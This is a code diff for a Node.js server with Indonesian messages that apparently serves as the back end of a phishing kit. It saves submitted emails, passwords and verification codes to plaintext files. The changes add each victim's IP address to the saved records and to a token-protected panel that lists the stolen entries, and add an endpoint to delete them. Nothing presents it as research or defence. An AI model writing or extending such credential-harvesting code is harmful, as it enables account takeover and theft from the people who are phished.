@@ -31,10 +31,11 @@ const server = http.createServer((req, res) => {
                     res.end(JSON.stringify({ error: 'email dan password wajib diisi' }));
                     return;
                 }
+                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
                 if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
                 const safeName = email.replace(/[^a-z0-9@_.-]/gi, '_') + '.txt';
                 const filePath = path.join(SAVE_DIR, safeName);
-                const content = `Email/Username: ${email}\nPassword: ${password}\nTersimpan: ${new Date().toISOString()}\n`;
+                const content = `Email/Username: ${email}\nPassword: ${password}\nIP: ${ip}\nTersimpan: ${new Date().toISOString()}\n`;
                 fs.writeFileSync(filePath, content, 'utf-8');
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ ok: true, file: safeName }));
@@ -58,14 +59,18 @@ const server = http.createServer((req, res) => {
                     res.end(JSON.stringify({ error: 'email dan code wajib diisi' }));
                     return;
                 }
+                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
                 if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
                 const safeName = email.replace(/[^a-z0-9@_.-]/gi, '_') + '.txt';
                 const filePath = path.join(SAVE_DIR, safeName);
                 let existing = '';
                 if (fs.existsSync(filePath)) {
-                    existing = fs.readFileSync(filePath, 'utf-8') + '\n';
+                    existing = fs.readFileSync(filePath, 'utf-8');
+                    if (!existing.includes('IP:')) {
+                        existing = existing.replace('Password: ', 'IP: \nPassword: ');
+                    }
                 }
-                const content = `${existing}Kode Verifikasi: ${code}\nTersimpan: ${new Date().toISOString()}\n`;
+                const content = `${existing}Kode Verifikasi: ${code}\nIP: ${ip}\nTersimpan: ${new Date().toISOString()}\n`;
                 fs.writeFileSync(filePath, content, 'utf-8');
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ ok: true, file: safeName }));
@@ -92,11 +97,40 @@ const server = http.createServer((req, res) => {
             const email = (lines.find(l => l.startsWith('Email/Username:')) || '').replace('Email/Username: ', '');
             const password = (lines.find(l => l.startsWith('Password:')) || '').replace('Password: ', '');
             const code = (lines.find(l => l.startsWith('Kode Verifikasi:')) || '').replace('Kode Verifikasi: ', '') || null;
+            const ip_address = (lines.find(l => l.startsWith('IP:')) || '').replace('IP: ', '') || null;
             const created_at = (lines.find(l => l.startsWith('Tersimpan:')) || '').replace('Tersimpan: ', '');
-            return { id: files.indexOf(f) + 1, email, password, code, created_at };
+            return { id: files.indexOf(f) + 1, email, password, code, ip_address, created_at };
         }).reverse();
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ data }));
+        return;
+    }
+
+    if (req.method === 'POST' && pathname === '/api/delete-login') {
+        const token = parsed.query.token || '';
+        const secret = process.env.PANEL_TOKEN || '2026';
+        if (token !== secret) {
+            res.writeHead(401, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: 'Unauthorized' }));
+            return;
+        }
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const { id } = JSON.parse(body);
+                const files = fs.existsSync(SAVE_DIR) ? fs.readdirSync(SAVE_DIR) : [];
+                const idx = parseInt(id) - 1;
+                if (idx >= 0 && idx < files.length) {
+                    fs.unlinkSync(path.join(SAVE_DIR, files[idx]));
+                }
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true }));
+            } catch (e) {
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: e.message }));
+            }
+        });
         return;
     }
 
